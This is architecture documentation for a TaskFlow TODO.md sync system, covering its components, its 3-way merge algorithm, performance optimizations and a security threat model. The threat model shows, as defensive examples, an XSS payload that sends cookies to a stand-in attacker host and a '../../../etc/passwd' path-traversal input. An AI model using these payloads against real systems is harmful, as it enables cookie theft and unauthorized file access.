# TODO.md Sync System - Architecture Documentation

Technical architecture and design documentation for the TODO.md synchronization system.

## Table of Contents

- [System Overview](#system-overview)
- [Architecture Diagram](#architecture-diagram)
- [Component Responsibilities](#component-responsibilities)
- [Data Flow](#data-flow)
- [3-Way Merge Algorithm](#3-way-merge-algorithm)
- [Security Architecture](#security-architecture)
- [Performance Optimizations](#performance-optimizations)
- [Error Handling](#error-handling)

---

## System Overview

The TODO.md sync system enables bidirectional synchronization between a Markdown file (`TODO.md`) and the TaskFlow application's IndexedDB storage.

### Key Objectives

1. **Bidirectional Sync**: Changes flow both TODO.md ↔ TaskFlow App
2. **Conflict Resolution**: Automatic detection and resolution of conflicts
3. **Data Integrity**: No data loss through 3-way merge algorithm
4. **Security**: Path validation, XSS prevention, authentication
5. **Performance**: Differential sync, batch operations, caching

### Design Principles

- **Dependency Injection**: All components use DI for testability
- **Single Responsibility**: Each component has one clear purpose
- **Defensive Programming**: Validate all inputs, sanitize all outputs
- **Fail-Safe**: Errors don't corrupt data, backups before writes
- **Observable**: Comprehensive logging and metrics

---

## Architecture Diagram

### High-Level Architecture

```
┌─────────────────────────────────────────────────────────────────┐
│                    Project Root Directory                        │
│                                                                   │
│  ┌──────────────┐         ┌───────────────────┐                 │
│  │   TODO.md    │◄────────│  FileWatcher      │                 │
│  │  (Markdown)  │         │  (chokidar)       │                 │
│  └──────┬───────┘         └────────┬──────────┘                 │
│         │                          │                             │
│         │ read/write               │ change events               │
│         ▼                          ▼                             │
│  ┌──────────────────────────────────────────────────┐           │
│  │            SyncCoordinator                       │           │
│  │  ┌────────────────────────────────────────────┐ │           │
│  │  │  MarkdownParser    MarkdownSerializer      │ │           │
│  │  │  PathValidator     Sanitizer               │ │           │
│  │  │  ThreeWayMerger    ConflictResolver        │ │           │
│  │  │  DiffDetector      BatchWriter             │ │           │
│  │  │  CircuitBreaker    Retry                   │ │           │
│  │  └────────────────────────────────────────────┘ │           │
│  └──────────────┬───────────────────────────────────┘           │
│                 │                                                │
│                 │ GraphQL Mutations                              │
│                 ▼                                                │
│  ┌──────────────────────────────────────────────────┐           │
│  │      TaskFlow GraphQL Server                     │           │
│  │  • IndexedDB (idb)                               │           │
│  │  • MCP Server Integration                        │           │
│  │  • GraphQL Subscriptions                         │           │
│  └──────────────┬───────────────────────────────────┘           │
│                 │                                                │
│                 │ updates                                        │
│                 ▼                                                │
│  ┌──────────────────────────────────────────────────┐           │
│  │      React Frontend (localhost:5173)             │           │
│  │  • Task List UI                                  │           │
│  │  • Board View                                    │           │
│  └──────────────────────────────────────────────────┘           │
└───────────────────────────────────────────────────────────────────┘

┌───────────────────────────────────────────────────────────────────┐
│              Claude Code / Claude Desktop                         │
│  ┌──────────────────────────────────────────────────┐            │
│  │   MCP Client                                     │            │
│  │   • todo_sync tool                               │            │
│  │   • Authentication (MCP_AUTH_TOKEN)              │            │
│  └──────────────────────────────────────────────────┘            │
└───────────────────────────────────────────────────────────────────┘
```

### Component Layer Architecture

```
┌─────────────────────────────────────────────────────────────┐
│                    Presentation Layer                        │
│  • MCP Tool Interface (todo_sync)                           │
│  • GraphQL API                                              │
│  • React UI                                                 │
└─────────────────────────────────────────────────────────────┘
                            │
                            ▼
┌─────────────────────────────────────────────────────────────┐
│                  Orchestration Layer                         │
│  • SyncCoordinator (main orchestrator)                      │
│  • SyncStateManager (state tracking)                        │
└─────────────────────────────────────────────────────────────┘
                            │
                            ▼
┌─────────────────────────────────────────────────────────────┐
│                    Business Logic Layer                      │
│  ┌───────────────┬───────────────┬──────────────────┐       │
│  │ Parsers       │ Merge         │ Security         │       │
│  │ • Parser      │ • ThreeWay    │ • PathValidator  │       │
│  │ • Serializer  │ • Conflict    │ • Sanitizer      │       │
│  └───────────────┴───────────────┴──────────────────┘       │
└─────────────────────────────────────────────────────────────┘
                            │
                            ▼
┌─────────────────────────────────────────────────────────────┐
│                  Infrastructure Layer                        │
│  ┌───────────────┬───────────────┬──────────────────┐       │
│  │ Performance   │ Resilience    │ Storage          │       │
│  │ • DiffDetector│ • Retry       │ • IndexedDB      │       │
│  │ • BatchWriter │ • Circuit     │ • FileSystem     │       │
│  │ • Cache       │   Breaker     │                  │       │
│  └───────────────┴───────────────┴──────────────────┘       │
└─────────────────────────────────────────────────────────────┘
```

---

## Component Responsibilities

### Orchestration Components

#### SyncCoordinator

**Location**: `src/sync/database/sync-coordinator.ts`

**Responsibilities**:
- Orchestrate all sync operations
- Manage component lifecycle
- Track sync statistics and history
- Handle file watcher events
- Coordinate backup operations

**Key Methods**:
```typescript
class SyncCoordinator {
  async start(): Promise<void>
  async stop(): Promise<void>
  async syncFileToApp(): Promise<void>
  async syncAppToFile(): Promise<void>
  getStats(): SyncStatistics
  getSyncHistory(limit: number): SyncHistory[]
  getConflicts(): Conflict[]
}
```

**Dependencies**:
- MarkdownParser
- MarkdownSerializer
- ThreeWayMerger
- ConflictResolver
- PathValidator
- DiffDetector
- BatchWriter

#### SyncStateManager

**Location**: `src/sync/database/sync-state-manager.ts`

**Responsibilities**:
- Track base state (common ancestor for 3-way merge)
- Maintain sync history
- Store conflict information
- Manage statistics

**Key Methods**:
```typescript
class SyncStateManager {
  async getBaseState(): Promise<Task[]>
  async updateBaseState(tasks: Task[]): Promise<void>
  async recordSyncHistory(history: SyncHistory): Promise<void>
  async getStatistics(): Promise<SyncStatistics>
}
```

### Parser Components

#### MarkdownParser

**Location**: `src/sync/parsers/markdown-parser.ts`

**Responsibilities**:
- Parse TODO.md into Task objects
- Detect task status (`[ ]` vs `[x]`)
- Extract priority from sections
- Parse metadata (due dates, descriptions)
- Sanitize input (XSS prevention)

**Algorithm**:
```typescript
parse(content: string): Task[] {
  1. Validate file size and path
  2. Split content into lines
  3. Track current section for priority
  4. For each line:
     a. Detect section headers (## 🔴 ...)
     b. Match task pattern (- [ ] ...)
     c. Extract title, status, metadata
     d. Sanitize all strings
  5. Return array of Task objects
}
```

#### MarkdownSerializer

**Location**: `src/sync/parsers/markdown-serializer.ts`

**Responsibilities**:
- Convert Task objects to Markdown format
- Group tasks by priority (sections)
- Format metadata (due dates, descriptions)
- Generate consistent, readable output

**Algorithm**:
```typescript
serialize(tasks: Task[]): string {
  1. Group tasks by priority
  2. Generate header with timestamp
  3. For each priority section:
     a. Write section header (## 🔴 ...)
     b. For each task:
        - Format checkbox ([x] or [ ])
        - Write title (bold for high priority)
        - Write metadata (due date, description)
  4. Return formatted Markdown string
}
```

### Merge Components

#### ThreeWayMerger

**Location**: `src/sync/merge/three-way-merger.ts`

**Responsibilities**:
- Implement 3-way merge algorithm
- Compare base, file, and app versions
- Auto-merge non-conflicting changes
- Detect field-level conflicts
- Generate detailed merge reports

**Algorithm**:
```typescript
merge(base: Task, file: Task, app: Task): MergeResult {
  1. For each field in Task:
     a. Compare base vs file (fileChange)
     b. Compare base vs app (appChange)
     c. If both unchanged: keep base value
     d. If only file changed: use file value
     e. If only app changed: use app value
     f. If both changed differently: CONFLICT

  2. Collect all conflicts

  3. If no conflicts:
     - Return auto-merged task

  4. If conflicts exist:
     - Apply conflict resolution policy
     - Return resolved task with conflict report
}
```

**3-Way Merge Table**:
```
Base   | File   | App    | Result      | Strategy
-------|--------|--------|-------------|----------
A      | A      | A      | A           | No change
A      | B      | A      | B           | File wins (only file changed)
A      | A      | B      | B           | App wins (only app changed)
A      | B      | B      | B           | Auto-merge (same change)
A      | B      | C      | CONFLICT!   | Apply policy
```

#### ConflictResolver

**Location**: `src/sync/merge/conflict-resolver.ts`

**Responsibilities**:
- Resolve detected conflicts
- Apply conflict resolution policies
- Track conflict statistics
- Generate conflict reports

**Resolution Policies**:
```typescript
type Policy =
  | 'prefer_file'   // File version wins
  | 'prefer_app'    // App version wins
  | 'manual'        // Require user intervention
  | 'last_write'    // Most recent timestamp wins
```

### Security Components

#### PathValidator

**Location**: `src/sync/security/path-validator.ts`

**Responsibilities**:
- Prevent path traversal attacks
- Validate file paths are within allowed directories
- Check file size limits
- Verify file exists and is readable

**Validation Rules**:
```typescript
validate(path: string): string {
  1. Resolve absolute path
  2. Check path starts with allowed base directory
  3. Prevent .. traversal
  4. Verify file size < maxFileSizeMB
  5. Return safe path or throw error
}
```

**Security Checks**:
- `../../../etc/passwd` → ❌ Rejected
- `./TODO.md` → ✅ Allowed
- `/tmp/tasks.md` → ❌ Rejected (outside project)

#### Sanitizer

**Location**: `src/sync/security/sanitizer.ts`

**Responsibilities**:
- Prevent XSS attacks
- Sanitize HTML in Markdown
- Clean malicious scripts
- Preserve safe formatting

**Sanitization Strategy**:
```typescript
// Uses isomorphic-dompurify
sanitizeTitle(title: string): string {
  return DOMPurify.sanitize(title, {
    ALLOWED_TAGS: [],        // Strip all HTML
    ALLOWED_ATTR: []
  });
}

sanitizeDescription(desc: string): string {
  return DOMPurify.sanitize(desc, {
    ALLOWED_TAGS: ['p', 'br', 'strong', 'em', 'code'],
    ALLOWED_ATTR: []
  });
}
```

**Examples**:
- `<script>alert('XSS')</script>` → `` (removed)
- `**Bold text**` → `**Bold text**` (preserved)
- `<a href="javascript:void(0)">Link</a>` → `Link` (sanitized)

### Performance Components

#### DiffDetector

**Location**: `src/sync/performance/diff-detector.ts`

**Responsibilities**:
- Detect changes between versions
- Identify added, modified, deleted tasks
- Enable differential sync (only process changes)
- Use efficient diffing algorithms

**Algorithm**:
```typescript
detectChanges(oldTasks: Task[], newTasks: Task[]): Diff {
  1. Create maps by task ID
  2. Find added tasks (in new, not in old)
  3. Find deleted tasks (in old, not in new)
  4. Find modified tasks (in both, but different)
     - Compare field by field
     - Only flag if actual content changed
  5. Return { added, modified, deleted }
}
```

**Optimization**: Uses Map lookups (O(1)) instead of array finds (O(n))

#### BatchWriter

**Location**: `src/sync/performance/batch-writer.ts`

**Responsibilities**:
- Batch IndexedDB write operations
- Reduce transaction overhead
- Improve write performance

**Performance Impact**:
```
Before (N+1 problem):
  100 tasks = 100 transactions = ~500ms

After (batch write):
  100 tasks = 1 transaction = ~50ms

10x performance improvement! ✅
```

**Implementation**:
```typescript
async bulkUpsert(tasks: Task[]): Promise<void> {
  const db = await openDB('taskflow');

  // Single transaction for all tasks
  await db.transaction('tasks', 'readwrite', async (tx) => {
    await Promise.all(
      tasks.map(task => tx.store.put(task))
    );
  });
}
```

### Resilience Components

#### Retry

**Location**: `src/sync/resilience/retry.ts`

**Responsibilities**:
- Retry failed operations
- Exponential backoff
- Configurable max attempts

**Configuration**:
```typescript
const retryConfig = {
  maxAttempts: 3,
  initialDelay: 1000,      // 1 second
  backoffFactor: 2,        // exponential
  maxDelay: 10000          // 10 seconds max
};
```

**Retry Schedule**:
- Attempt 1: immediate
- Attempt 2: 1 second delay
- Attempt 3: 2 second delay
- Attempt 4: fails permanently

#### CircuitBreaker

**Location**: `src/sync/resilience/circuit-breaker.ts`

**Responsibilities**:
- Prevent cascading failures
- Fast-fail when service is down
- Auto-recovery after timeout

**States**:
```
CLOSED (normal) → OPEN (failing) → HALF_OPEN (testing) → CLOSED
                     ↑                                      ↓
                     └──────── still failing ──────────────┘
```

**Configuration**:
```typescript
const breakerConfig = {
  failureThreshold: 5,     // Open after 5 failures
  resetTimeout: 30000,     // Try again after 30s
  monitoringWindow: 60000  // Track failures in 60s window
};
```

---

## Data Flow

### File → App Sync

```
1. User edits TODO.md
   ↓
2. FileWatcher detects change
   ↓
3. Debounce (500ms) + Throttle (2s)
   ↓
4. SyncCoordinator.syncFileToApp() triggered
   ↓
5. PathValidator checks file path
   ↓
6. MarkdownParser parses TODO.md
   ↓
7. Sanitizer cleans all content
   ↓
8. SyncStateManager loads base state
   ↓
9. ThreeWayMerger merges (base, file, app)
   ↓
10. ConflictResolver resolves conflicts
    ↓
11. DiffDetector finds changes
    ↓
12. BatchWriter writes to IndexedDB
    ↓
13. SyncStateManager updates base state
    ↓
14. GraphQL Subscription notifies React UI
    ↓
15. React UI updates automatically
```

### App → File Sync

```
1. User updates task in React UI
   ↓
2. GraphQL Mutation saves to IndexedDB
   ↓
3. Webhook triggers SyncCoordinator.syncAppToFile()
   ↓
4. SyncCoordinator reads tasks from IndexedDB
   ↓
5. SyncStateManager loads base state
   ↓
6. ThreeWayMerger merges (base, file, app)
   ↓
7. ConflictResolver resolves conflicts
   ↓
8. MarkdownSerializer generates TODO.md content
   ↓
9. PathValidator validates write path
   ↓
10. FileSystem creates backup (TODO.md.backup)
    ↓
11. FileWatcher paused (prevent loop)
    ↓
12. FileSystem writes TODO.md (atomic)
    ↓
13. SyncStateManager updates base state
    ↓
14. FileWatcher resumed after 1s
```

### MCP Tool Invocation

```
1. Claude Code: user types "sync TODO.md"
   ↓
2. MCP Client calls todo_sync tool
   ↓
3. Authentication: validate MCP_AUTH_TOKEN
   ↓
4. Create SyncCoordinator instance
   ↓
5. Execute requested action:
   - file_to_app → syncFileToApp()
   - app_to_file → syncAppToFile()
   - status → getStats() + getConflicts()
   ↓
6. Return JSON response to Claude Code
   ↓
7. Claude Code displays results to user
```

---

## 3-Way Merge Algorithm

### Overview

The 3-way merge algorithm prevents data loss by comparing three versions:
- **Base**: Last synchronized state (common ancestor)
- **File**: Current TODO.md state
- **App**: Current IndexedDB state

### Algorithm Steps

#### 1. Load Versions

```typescript
const base = await syncStateManager.getBaseState();
const file = await markdownParser.parse('TODO.md');
const app = await database.getAllTasks();
```

#### 2. Compare Each Task

```typescript
for each task_id in (base ∪ file ∪ app):
  baseTask = base[task_id]
  fileTask = file[task_id]
  appTask = app[task_id]

  result = threeWayMerger.merge(baseTask, fileTask, appTask)

  if result.hasConflicts:
    resolved = conflictResolver.resolve(result.conflicts)

  mergedTasks.push(result.mergedTask)
```

#### 3. Field-Level Merge

For each field in Task (title, status, priority, etc.):

```typescript
function mergeField(base, file, app) {
  const fileChanged = (file !== base)
  const appChanged = (app !== base)

  if (!fileChanged && !appChanged):
    return base  // No changes

  if (fileChanged && !appChanged):
    return file  // Only file changed

  if (!fileChanged && appChanged):
    return app   // Only app changed

  if (fileChanged && appChanged && file === app):
    return file  // Same change, auto-merge

  // CONFLICT: both changed differently
  return applyConflictPolicy(base, file, app)
}
```

### Conflict Detection

#### Conflict Types

##### 1. Modification Conflict

```typescript
Base:  { status: 'pending' }
File:  { status: 'completed' }
App:   { status: 'in_progress' }
→ CONFLICT: both modified status field
```

##### 2. Delete-Modify Conflict

```typescript
Base:  { id: '123', title: 'Task' }
File:  { id: '123', title: 'Updated Task' }  // modified
App:   null                                  // deleted
→ CONFLICT: file modified, app deleted
```

##### 3. Add-Add Conflict

```typescript
Base:  null
File:  { id: '123', title: 'Task A' }  // added
App:   { id: '123', title: 'Task B' }  // added (same ID!)
→ CONFLICT: both added task with same ID
```

### Conflict Resolution Strategies

#### Last-Write-Wins

```typescript
function lastWriteWins(base, file, app) {
  if (file.updatedAt > app.updatedAt):
    return file  // File is newer
  else:
    return app   // App is newer
}
```

#### Prefer-File

```typescript
function preferFile(base, file, app) {
  if (file exists):
    return file  // Always use file version
  else:
    return app   // Fallback to app if file deleted
}
```

#### Prefer-App

```typescript
function preferApp(base, file, app) {
  if (app exists):
    return app   // Always use app version
  else:
    return file  // Fallback to file if app deleted
}
```

### Example Walkthrough

#### Scenario

```typescript
// Base (last sync)
{
  id: 'task-1',
  title: 'Implement auth',
  status: 'pending',
  priority: 'medium',
  dueDate: '2025-11-15'
}

// File (user edited TODO.md)
{
  id: 'task-1',
  title: 'Implement auth',      // unchanged
  status: 'completed',           // CHANGED
  priority: 'medium',            // unchanged
  dueDate: '2025-11-15'          // unchanged
}

// App (user edited in UI)
{
  id: 'task-1',
  title: 'Implement auth',      // unchanged
  status: 'pending',            // unchanged
  priority: 'high',             // CHANGED
  dueDate: '2025-11-20'         // CHANGED
}
```

#### Merge Result

```typescript
// Field-by-field analysis:
title:    base=A, file=A, app=A  → A (no change)
status:   base=P, file=C, app=P  → C (file changed)
priority: base=M, file=M, app=H  → H (app changed)
dueDate:  base=11/15, file=11/15, app=11/20  → 11/20 (app changed)

// Merged result (no conflicts!)
{
  id: 'task-1',
  title: 'Implement auth',
  status: 'completed',      // from file
  priority: 'high',         // from app
  dueDate: '2025-11-20'     // from app
}
```

#### With Conflict

```typescript
// If both changed status:
status: base=pending, file=completed, app=in_progress

// Conflict detected!
{
  field: 'status',
  baseValue: 'pending',
  fileValue: 'completed',
  appValue: 'in_progress',
  severity: 'high'
}

// Resolution (prefer_file policy):
status: 'completed'  // file version wins
```

---

## Security Architecture

### Threat Model

#### 1. Path Traversal

**Threat**: Attacker provides malicious path to read/write arbitrary files

**Example Attack**:
```typescript
todo_sync file_to_app --todoPath "../../../etc/passwd"
```

**Mitigation**:
```typescript
class PathValidator {
  validate(userPath: string): string {
    const basePath = process.cwd()
    const resolved = path.resolve(basePath, userPath)

    if (!resolved.startsWith(basePath)) {
      throw new Error('Path traversal detected')
    }

    return resolved
  }
}
```

#### 2. XSS Injection

**Threat**: Malicious JavaScript in task titles/descriptions

**Example Attack**:
```markdown
- [ ] <script>fetch('https://evil.com?cookie='+document.cookie)</script>
```

**Mitigation**:
```typescript
class Sanitizer {
  sanitizeTitle(title: string): string {
    return DOMPurify.sanitize(title, {
      ALLOWED_TAGS: [],      // Remove all HTML
      ALLOWED_ATTR: []
    })
  }
}
```

**Result**: `<script>fetch...</script>` → `` (removed)

#### 3. Unauthorized MCP Access

**Threat**: Unauthenticated client accessing todo_sync tool

**Mitigation**:
```typescript
function validateAuthToken(): boolean {
  const token = process.env.MCP_AUTH_TOKEN

  if (!token || token.length < 16) {
    logger.logSecurityEvent('auth_failure', ...)
    return false
  }

  // In production: validate against stored hash
  return true
}
```

#### 4. File Size DoS

**Threat**: Extremely large TODO.md causes memory exhaustion

**Mitigation**:
```typescript
class PathValidator {
  async validateFileSize(path: string): Promise<void> {
    const stats = await fs.stat(path)
    const maxBytes = 5 * 1024 * 1024  // 5MB

    if (stats.size > maxBytes) {
      throw new Error('File size exceeds 5MB limit')
    }
  }
}
```

### Security Layers

```
┌─────────────────────────────────────────┐
│  Layer 1: Input Validation              │
│  • Path validation                      │
│  • File size check                      │
│  • Format validation                    │
└─────────────────────────────────────────┘
              ↓
┌─────────────────────────────────────────┐
│  Layer 2: Authentication                │
│  • MCP_AUTH_TOKEN validation            │
│  • Environment variable check           │
└─────────────────────────────────────────┘
              ↓
┌─────────────────────────────────────────┐
│  Layer 3: Sanitization                  │
│  • HTML stripping (DOMPurify)           │
│  • Script removal                       │
│  • Attribute cleaning                   │
└─────────────────────────────────────────┘
              ↓
┌─────────────────────────────────────────┐
│  Layer 4: Business Logic                │
│  • Parser, Merger, Serializer           │
│  • Operating on clean data              │
└─────────────────────────────────────────┘
              ↓
┌─────────────────────────────────────────┐
│  Layer 5: Output Validation             │
│  • Backup before write                  │
│  • Atomic file operations               │
│  • IndexedDB transactions               │
└─────────────────────────────────────────┘
```

### Audit Logging

All security events are logged:

```typescript
logger.logSecurityEvent(
  eventType: 'auth_success' | 'auth_failure' | 'path_traversal' | 'xss_detected',
  metadata: { feature: string, userId?: string },
  message: string
)
```

**Example Log**:
```json
{
  "level": "warn",
  "time": "2025-11-09T10:30:00Z",
  "eventType": "path_traversal",
  "feature": "todo-sync",
  "message": "Path traversal attempt detected",
  "path": "../../../etc/passwd",
  "blocked": true
}
```

---

## Performance Optimizations

### 1. Differential Sync

**Problem**: Parsing entire TODO.md on every change is wasteful

**Solution**: Detect changed lines using fast-diff algorithm

```typescript
class DiffDetector {
  detectChangedLines(oldContent, newContent): number[] {
    const changes = diff(oldContent, newContent)
    return extractChangedLineNumbers(changes)
  }
}
```

**Impact**:
- Before: 1000 tasks → parse all 1000 tasks (200ms)
- After: 1000 tasks, 10 changed → parse only 10 tasks (20ms)
- **10x faster** for incremental edits ✅

### 2. Batch Write Operations

**Problem**: N+1 problem writing tasks to IndexedDB

**Solution**: Single transaction for all writes

```typescript
// Before (slow)
for (const task of tasks) {
  await db.tasks.put(task)  // 100 transactions
}

// After (fast)
await db.transaction('tasks', 'readwrite', async (tx) => {
  await Promise.all(tasks.map(t => tx.store.put(t)))
})  // 1 transaction
```

**Impact**:
- Before: 100 tasks = 500ms
- After: 100 tasks = 50ms
- **10x faster** writes ✅

### 3. Debounce + Throttle

**Problem**: Rapid file edits trigger excessive syncs

**Solution**: Combine debounce (delay) and throttle (rate limit)

```typescript
const debouncedSync = debounce(sync, 500)     // Wait 500ms after last change
const throttledSync = throttle(sync, 2000)    // Max 1 sync per 2 seconds
```

**Impact**:
- Before: 10 edits in 5s → 10 syncs
- After: 10 edits in 5s → 3 syncs
- **3x fewer** sync operations ✅

### 4. Lazy Loading

**Strategy**: Load data only when needed

```typescript
class SyncCoordinator {
  private baseState?: Task[]

  async getBaseState(): Promise<Task[]> {
    if (!this.baseState) {
      this.baseState = await this.stateManager.getBaseState()
    }
    return this.baseState
  }
}
```

### 5. Caching

**Strategy**: Cache parsed TODO.md to avoid re-parsing

```typescript
class MarkdownParser {
  private cache = new Map<string, Task[]>()

  async parse(filePath: string): Promise<Task[]> {
    const stats = await fs.stat(filePath)
    const cacheKey = `${filePath}:${stats.mtime.getTime()}`

    if (this.cache.has(cacheKey)) {
      return this.cache.get(cacheKey)!
    }

    const tasks = await this.parseFile(filePath)
    this.cache.set(cacheKey, tasks)
    return tasks
  }
}
```

---

## Error Handling

### Error Classification

#### 1. Recoverable Errors

Errors that can be retried:
- Network timeouts
- IndexedDB locked
- File temporarily locked

**Strategy**: Retry with exponential backoff

```typescript
await retry(async () => {
  await fs.writeFile(path, content)
}, {
  maxAttempts: 3,
  backoff: 'exponential'
})
```

#### 2. Non-Recoverable Errors

Errors that should fail immediately:
- Path traversal detected
- Invalid file format
- Authentication failed

**Strategy**: Fail fast, log, return error to user

```typescript
if (!validatePath(path)) {
  logger.error('Path traversal detected')
  throw new Error('Invalid path')
}
```

### Error Propagation

```
Component Level          → Log Level → User Feedback
────────────────────────────────────────────────────
PathValidator.validate   → error    → "Invalid file path"
MarkdownParser.parse     → error    → "Failed to parse TODO.md at line 42"
ThreeWayMerger.merge     → warn     → "Conflicts detected, auto-resolved"
CircuitBreaker (open)    → warn     → "Sync temporarily unavailable"
DiffDetector             → debug    → (internal, no user message)
```

### Circuit Breaker Pattern

Prevents cascading failures when sync is failing repeatedly:

```typescript
const breaker = new CircuitBreaker(syncFunction, {
  failureThreshold: 5,
  resetTimeout: 30000
})

try {
  await breaker.execute()
} catch (error) {
  if (breaker.isOpen()) {
    // Fast-fail, don't retry
    return { error: 'Sync service temporarily unavailable' }
  }
}
```

**States**:
- **CLOSED**: Normal operation, sync works
- **OPEN**: Too many failures, fast-fail all requests
- **HALF_OPEN**: Testing recovery, allow one request

---

## Design Patterns Used

### 1. Dependency Injection

All components receive dependencies via constructor:

```typescript
class SyncCoordinator {
  constructor(
    private parser: MarkdownParser,
    private merger: ThreeWayMerger,
    private writer: BatchWriter
  ) {}
}
```

**Benefits**: Testability, flexibility, loose coupling

### 2. Strategy Pattern

Conflict resolution policies are interchangeable strategies:

```typescript
interface ConflictResolutionStrategy {
  resolve(conflict: Conflict): Task
}

class PreferFileStrategy implements ConflictResolutionStrategy { }
class PreferAppStrategy implements ConflictResolutionStrategy { }
class LastWriteWinsStrategy implements ConflictResolutionStrategy { }
```

### 3. Observer Pattern

Components emit events for monitoring:

```typescript
syncCoordinator.on('sync:complete', (stats) => {
  logger.info('Sync completed', stats)
})

syncCoordinator.on('conflict:detected', (conflict) => {
  metrics.increment('conflicts.detected')
})
```

### 4. Command Pattern

MCP tool actions are commands:

```typescript
interface SyncCommand {
  execute(): Promise<Result>
}

class FileToAppCommand implements SyncCommand { }
class AppToFileCommand implements SyncCommand { }
class StatusCommand implements SyncCommand { }
```

---

## Future Enhancements

### Phase 6 Roadmap

1. **Manual Conflict Resolution UI**
   - Interactive conflict picker in React UI
   - Side-by-side diff view

2. **Real-time Collaboration**
   - Multiple users editing TODO.md
   - Operational Transform for concurrent edits

3. **Advanced File Watcher**
   - Cross-platform file watching
   - Network drive support

4. **Hierarchical Tasks**
   - Parent-child task relationships
   - Nested TODO.md sections

5. **Performance Monitoring**
   - Sync duration metrics
   - Performance regression alerts

---

**Version**: 1.0
**Last Updated**: 2025-11-09
**Maintainer**: TaskFlow Team
